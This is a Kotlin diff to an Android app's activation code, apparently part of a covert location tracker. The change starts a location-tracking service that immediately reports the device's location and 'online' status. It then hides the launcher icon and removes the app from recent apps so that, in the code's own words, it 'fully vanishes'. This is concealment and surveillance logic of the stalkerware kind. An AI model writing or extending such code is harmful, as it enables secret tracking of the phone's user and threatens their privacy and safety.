@@ -157,6 +157,16 @@ class MainActivity : AppCompatActivity() {
     // ─── Activation ───────────────────────────────────────────────────────────
 
     private fun proceedWithActivation() {
+        // Clear any saved start location so the service establishes a fresh
+        // origin and sends the initial "online + location" message right away.
+        prefs.edit()
+            .putBoolean(Prefs.KEY_TRACKING_ACTIVE, true)
+            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED, true)
+            .remove(Prefs.KEY_START_LAT)
+            .remove(Prefs.KEY_START_LNG)
+            .remove(Prefs.KEY_LAST_SENT_TIME)
+            .apply()
+
         // Start the foreground service
         val intent = Intent(this, LocationTrackingService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -165,19 +175,15 @@ class MainActivity : AppCompatActivity() {
             startService(intent)
         }
 
-        prefs.edit()
-            .putBoolean(Prefs.KEY_TRACKING_ACTIVE, true)
-            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED, true)
-            .apply()
-
         showStealthActiveScreen()
 
-        // Hide the launcher icon after a short delay so the user sees confirmation first
+        // After 1.5 s: hide icon + remove from recents so the app fully vanishes
         Handler(Looper.getMainLooper()).postDelayed({
             hideLauncherIcon()
-        }, 2500)
+            finishAndRemoveTask()   // removes from recent-apps carousel
+        }, 1500)
 
-        Log.d("MainActivity", "Stealth mode activated — launcher icon will be hidden")
+        Log.d("MainActivity", "Stealth activated — will vanish from recents")
     }
 
     private fun hideLauncherIcon() {
